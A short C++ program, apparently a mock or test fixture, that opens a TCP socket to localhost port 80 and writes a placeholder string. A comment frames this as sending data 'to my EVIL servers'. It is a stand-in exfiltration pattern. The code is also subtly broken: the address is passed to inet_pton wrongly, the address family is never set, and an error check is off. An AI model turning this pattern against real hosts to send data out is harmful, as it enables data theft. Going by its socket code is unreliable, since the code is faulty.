#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
using namespace std;

int main() {
	// bout to send off all this data to my EVIL servers
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd < 0) perror("socket()");
	struct sockaddr_in addr;
	if(inet_pton(AF_INET, "127.0.0.1", &addr) < 0) perror("inet_pton()");
	addr.sin_port = htons(80);
	if(connect(fd, (struct sockaddr *)&addr, sizeof addr) < 0) perror("connect()");
	const char *x = "MALICIOUS DATA HERE";
	if(write(fd, x, strlen(x)) < 0) perror("write()");
	return 0;
}
